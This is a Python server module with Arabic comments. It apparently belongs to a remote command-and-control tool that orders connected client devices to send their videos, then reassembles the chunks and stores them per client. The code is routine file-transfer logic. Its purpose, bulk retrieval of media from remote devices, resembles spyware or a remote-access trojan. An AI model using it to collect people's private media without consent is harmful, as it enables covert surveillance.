#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
videos.py
============================================================
تنفيذ أمر GET VIDEO من جانب السيرفر.

المسؤوليات:
  1. إرسال أمر GET_VIDEOS للعميل.
  2. استقبال الفيديوهات (FILE_CHUNK) من العميل.
  3. تجميع الأجزاء وإعادة بناء الملفات.
  4. حفظ الملفات في storage/received/<client_id>/videos/.
  5. عرض تقدّم النقل مع السرعة والوقت المتبقي.
  6. التحقق من المساحة المتاحة على القرص.

الفروقات عن photos.py:
  - الفيديوهات أكبر → chunks أكبر (512KB - 1MB).
  - وقت النقل أطول → timeout أكبر.
  - مراقبة السرعة والوقت المتبقي.
  - التحقق من المساحة قبل الحفظ.

يعتمد على:
  - ClientSession (لإرسال الأوامر واستقبالها)
  - shutil.disk_usage (للتحقق من المساحة)

الاستخدام:
  handler = VideosCommand(session_manager)
  await handler.execute(client_id, limit=10)
============================================================
"""

import asyncio
import base64
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.client_session import ClientSession
from core.session_manager import SessionManager

logger = logging.getLogger("videos")


# ============================================================
# 1. الإعدادات
# ============================================================
BASE_DIR = Path(__file__).resolve().parent.parent.parent
STORAGE_DIR = BASE_DIR / "storage" / "received"

# مهلة انتظار كامل الفيديو (ثواني) - أطول من الصور
FILE_TIMEOUT_SECONDS = 600  # 10 دقائق

# الحد الأدنى من المساحة الحرة المطلوبة (1 GB)
MIN_FREE_SPACE_BYTES = 1024 * 1024 * 1024

# فاصل تحديث التقدم (ثواني)
PROGRESS_UPDATE_INTERVAL = 2.0


# ============================================================
# 2. نموذج فيديو قيد الاستقبال
# ============================================================
@dataclass
class IncomingVideo:
    """يمثّل فيديو قيد الاستقبال."""
    filename: str
    total_size: int = 0
    total_chunks: int = 0
    mime: str = "video/mp4"
    chunks: Dict[int, bytes] = field(default_factory=dict)
    started_at: float = field(default_factory=time.time)
    last_update: float = field(default_factory=time.time)
    last_progress_log: float = field(default_factory=time.time)

    # إحصائيات
    peak_chunks_per_sec: float = 0.0
    _last_chunk_count: int = 0
    _last_speed_check: float = field(default_factory=time.time)

    # --------------------------------------------------------
    # خصائص
    # --------------------------------------------------------
    @property
    def received_chunks(self) -> int:
        return len(self.chunks)

    @property
    def received_bytes(self) -> int:
        return sum(len(c) for c in self.chunks.values())

    @property
    def progress(self) -> float:
        """نسبة التقدم (0.0 → 1.0)."""
        if self.total_size > 0:
            return min(1.0, self.received_bytes / self.total_size)
        if self.total_chunks > 0:
            return self.received_chunks / self.total_chunks
        return 0.0

    @property
    def is_complete(self) -> bool:
        if self.total_chunks > 0:
            return self.received_chunks >= self.total_chunks
        # إذا لم يُحدَّد العدد، اعتمد على الحجم
        if self.total_size > 0:
            return self.received_bytes >= self.total_size
        return False

    @property
    def is_stale(self) -> bool:
        """هل تجاوز المهلة؟"""
        return (time.time() - self.last_update) > FILE_TIMEOUT_SECONDS

    @property
    def elapsed_seconds(self) -> float:
        """الوقت المنقضي."""
        return time.time() - self.started_at

    @property
    def speed_bytes_per_sec(self) -> float:
        """السرعة الحالية (bytes/sec)."""
        elapsed = self.elapsed_seconds
        if elapsed <= 0:
            return 0.0
        return self.received_bytes / elapsed

    @property
    def eta_seconds(self) -> float:
        """الوقت المتبقي المتوقع (ثواني)."""
        speed = self.speed_bytes_per_sec
        if speed <= 0 or self.total_size <= 0:
            return 0.0
        remaining = self.total_size - self.received_bytes
        return max(0.0, remaining / speed)

    # --------------------------------------------------------
    # عمليات
    # --------------------------------------------------------
    def add_chunk(self, index: int, data: bytes) -> None:
        """إضافة جزء."""
        self.chunks[index] = data
        self.last_update = time.time()

    def assemble(self) -> Optional[bytes]:
        """تجميع الأجزاء بالترتيب."""
        if not self.is_complete:
            return None
        try:
            return b"".join(
                self.chunks[i] for i in sorted(self.chunks.keys())
            )
        except KeyError as e:
            logger.error(f"Missing chunk {e} for {self.filename}")
            return None

    def progress_summary(self) -> str:
        """ملخص التقدم."""
        pct = int(self.progress * 100)
        received_mb = self.received_bytes / (1024 * 1024)
        total_mb = self.total_size / (1024 * 1024)
        speed_mbps = self.speed_bytes_per_sec / (1024 * 1024)
        eta_sec = self.eta_seconds

        eta_str = self._format_duration(eta_sec)

        return (
            f"{pct}% | "
            f"{received_mb:.1f}/{total_mb:.1f} MB | "
            f"{speed_mbps:.2f} MB/s | "
            f"ETA {eta_str}"
        )

    @staticmethod
    def _format_duration(seconds: float) -> str:
        """تنسيق المدة (مثال: '2m 15s')."""
        if seconds <= 0:
            return "0s"
        seconds = int(seconds)
        if seconds < 60:
            return f"{seconds}s"
        minutes = seconds // 60
        secs = seconds % 60
        if minutes < 60:
            return f"{minutes}m {secs}s"
        hours = minutes // 60
        mins = minutes % 60
        return f"{hours}h {mins}m"


# ============================================================
# 3. VideosCommand
# ============================================================
class VideosCommand:
    """
    منفّذ أمر GET VIDEO.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # الملفات قيد الاستقبال
        # {client_id: {filename: IncomingVideo}}
        self._incoming: Dict[str, Dict[str, IncomingVideo]] = {}

    # ========================================================
    # 3.1 التنفيذ
    # ========================================================
    async def execute(
        self,
        client_id: str,
        limit: int = 0,
        offset: int = 0,
        path: Optional[str] = None,
    ) -> bool:
        """
        إرسال أمر GET_VIDEOS للعميل.

        :param client_id: معرف العميل
        :param limit: الحد الأقصى للعدد (0 = الكل)
        :param offset: تخطي أول N فيديو
        :param path: مسار مخصص (اختياري)
        :return: True إذا تم الإرسال بنجاح
        """
        session = self.session_manager.get_session(client_id)
        if session is None:
            logger.warning(f"Client not found: {client_id}")
            return False

        # ----- التحقق من المساحة -----
        if not self._check_disk_space():
            logger.error("Not enough disk space for videos")
            return False

        # ----- تجهيز الأمر -----
        payload: Dict[str, Any] = {
            "limit": limit,
            "offset": offset,
        }
        if path:
            payload["path"] = path

        command = {
            "cmd": "GET_VIDEOS",
            "payload": payload,
        }

        # ----- إرسال -----
        ok = await session.send_command(command)
        if ok:
            logger.info(
                f"[{client_id}] GET_VIDEOS sent (limit={limit}, offset={offset})"
            )
        return ok

    # ========================================================
    # 3.2 معالج FILE_CHUNK الوارد
    # ========================================================
    async def on_file_chunk(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> Optional[Path]:
        """
        يُستدعى عند وصول FILE_CHUNK.

        :param client_id: معرف العميل
        :param message: الرسالة الواردة
        :return: مسار الملف المحفوظ إذا اكتمل، وإلا None
        """
        # ----- استخراج البيانات -----
        filename  = message.get("filename", "unknown")
        mime      = message.get("mime", "video/mp4")
        size      = int(message.get("size", 0))
        index     = int(message.get("index", 0))
        total     = int(message.get("total", 0))
        chunk_b64 = message.get("chunk", "")

        if not chunk_b64:
            logger.warning(f"[{client_id}] FILE_CHUNK without data")
            return None

        # ----- فك Base64 -----
        try:
            chunk_data = base64.b64decode(chunk_b64)
        except Exception as e:
            logger.error(f"[{client_id}] Invalid base64: {e}")
            return None

        # ----- سجل العميل -----
        if client_id not in self._incoming:
            self._incoming[client_id] = {}
        client_files = self._incoming[client_id]

        # ----- إنشاء سجل الفيديو -----
        if filename not in client_files:
            client_files[filename] = IncomingVideo(
                filename=filename,
                total_size=size,
                total_chunks=total,
                mime=mime,
            )
            logger.info(
                f"[{client_id}] 📹 Receiving video: {filename} "
                f"({self._format_size(size)}, {total} chunks)"
            )

        video = client_files[filename]

        # ----- إضافة الجزء -----
        video.add_chunk(index, chunk_data)

        # ----- عرض التقدم (كل PROGRESS_UPDATE_INTERVAL ثانية) -----
        self._maybe_log_progress(client_id, video)

        # ----- اكتمل؟ -----
        if video.is_complete:
            saved_path = await self._save_file(client_id, video)
            if saved_path:
                del client_files[filename]
                self._log_completion(client_id, video, saved_path)
                return saved_path

        return None

    # ========================================================
    # 3.3 حفظ الفيديو
    # ========================================================
    async def _save_file(self, client_id: str, video: IncomingVideo) -> Optional[Path]:
        """
        تجميع الأجزاء وحفظ الفيديو.
        """
        # ----- تجميع -----
        data = video.assemble()
        if data is None:
            logger.error(f"[{client_id}] Failed to assemble {video.filename}")
            return None

        # ----- التحقق من المساحة مرة أخرى -----
        if not self._check_disk_space(required_bytes=len(data)):
            logger.error(f"[{client_id}] Not enough space to save {video.filename}")
            return None

        # ----- مجلد العميل -----
        client_dir = STORAGE_DIR / client_id / "videos"
        client_dir.mkdir(parents=True, exist_ok=True)

        # ----- اسم آمن -----
        safe_name = self._sanitize_filename(video.filename)

        # ----- معالجة التكرار -----
        final_path = client_dir / safe_name
        counter = 1
        while final_path.exists():
            stem = re.sub(r"_\d+$", "", final_path.stem)
            suffix = final_path.suffix
            final_path = client_dir / f"{stem}_{counter}{suffix}"
            counter += 1

        # ----- كتابة غير معطّلة للحدث -----
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None, final_path.write_bytes, data
            )
            return final_path
        except Exception as e:
            logger.exception(f"Failed to write {final_path}: {e}")
            return None

    # ========================================================
    # 3.4 معالجة التقدم
    # ========================================================
    def _maybe_log_progress(self, client_id: str, video: IncomingVideo) -> None:
        """طباعة التقدم كل PROGRESS_UPDATE_INTERVAL ثانية."""
        now = time.time()
        if (now - video.last_progress_log) < PROGRESS_UPDATE_INTERVAL:
            return

        video.last_progress_log = now
        logger.info(f"[{client_id}] {video.filename}: {video.progress_summary()}")

    def _log_completion(self, client_id: str, video: IncomingVideo, path: Path) -> None:
        """طباعة رسالة الاكتمال."""
        elapsed = video.elapsed_seconds
        avg_speed = video.speed_bytes_per_sec / (1024 * 1024)
        logger.info(
            f"[{client_id}] ✅ Saved video: {path.name} "
            f"({self._format_size(video.received_bytes)}) "
            f"in {IncomingVideo._format_duration(elapsed)} "
            f"(avg {avg_speed:.2f} MB/s)"
        )

    # ========================================================
    # 3.5 إحصائيات وتنظيف
    # ========================================================
    def get_pending_videos(self, client_id: str) -> List[str]:
        """قائمة الفيديوهات قيد الاستقبال."""
        return list(self._incoming.get(client_id, {}).keys())

    def has_pending_videos(self, client_id: str) -> bool:
        """هل هناك فيديوهات قيد الاستقبال؟"""
        return bool(self._incoming.get(client_id))

    def get_progress(self, client_id: str) -> Dict[str, str]:
        """تقدّم كل فيديو قيد الاستقبال."""
        result = {}
        for filename, video in self._incoming.get(client_id, {}).items():
            result[filename] = video.progress_summary()
        return result

    async def cleanup_stale(self) -> int:
        """
        إزالة الفيديوهات التي تجاوزت المهلة.
        """
        removed = 0
        for client_id in list(self._incoming.keys()):
            files = self._incoming[client_id]
            for filename in list(files.keys()):
                video = files[filename]
                if video.is_stale:
                    logger.warning(
                        f"[{client_id}] Stale video removed: {filename} "
                        f"({video.progress_summary()})"
                    )
                    del files[filename]
                    removed += 1
            if not files:
                del self._incoming[client_id]
        return removed

    def clear_client(self, client_id: str) -> None:
        """مسح كل الفيديوهات قيد الاستقبال لعميل."""
        if client_id in self._incoming:
            count = len(self._incoming[client_id])
            del self._incoming[client_id]
            logger.info(f"[{client_id}] Cleared {count} pending videos")

    # ========================================================
    # 3.6 التحقق من المساحة
    # ========================================================
    @staticmethod
    def _check_disk_space(required_bytes: int = 0) -> bool:
        """
        التحقق من المساحة الحرة على القرص.
        """
        try:
            # تأكد أن مجلد التخزين موجود
            STORAGE_DIR.mkdir(parents=True, exist_ok=True)

            usage = shutil.disk_usage(STORAGE_DIR)
            free = usage.free

            min_required = max(MIN_FREE_SPACE_BYTES, required_bytes)

            if free < min_required:
                logger.error(
                    f"Low disk space: {free / (1024**3):.2f} GB free, "
                    f"need at least {min_required / (1024**3):.2f} GB"
                )
                return False

            return True

        except Exception as e:
            logger.error(f"Failed to check disk space: {e}")
            return True  # نسمح بالمتابعة عند الفشل

    # ========================================================
    # 3.7 أدوات مساعدة
    # ========================================================
    @staticmethod
    def _sanitize_filename(filename: str) -> str:
        """
        تنظيف اسم الملف من الأحرف الخطيرة.
        """
        if not filename:
            return "unnamed.mp4"

        name = os.path.basename(filename)
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)

        if name in (".", "..", ""):
            name = "unnamed.mp4"

        if len(name) > 200:
            stem, ext = os.path.splitext(name)
            name = stem[:180] + ext[:20]

        return name

    @staticmethod
    def _format_size(bytes_size: int) -> str:
        """تنسيق الحجم (KB, MB, GB)."""
        if bytes_size < 1024:
            return f"{bytes_size} B"
        if bytes_size < 1024 * 1024:
            return f"{bytes_size / 1024:.1f} KB"
        if bytes_size < 1024 * 1024 * 1024:
            return f"{bytes_size / (1024 * 1024):.1f} MB"
        return f"{bytes_size / (1024 * 1024 * 1024):.2f} GB"


# ============================================================
# 4. Singleton
# ============================================================
_default_handler: Optional[VideosCommand] = None


def get_videos_handler(session_manager: SessionManager) -> VideosCommand:
    """إرجاع المعالج (Singleton)."""
    global _default_handler
    if _default_handler is None:
        _default_handler = VideosCommand(session_manager)
    return _default_handler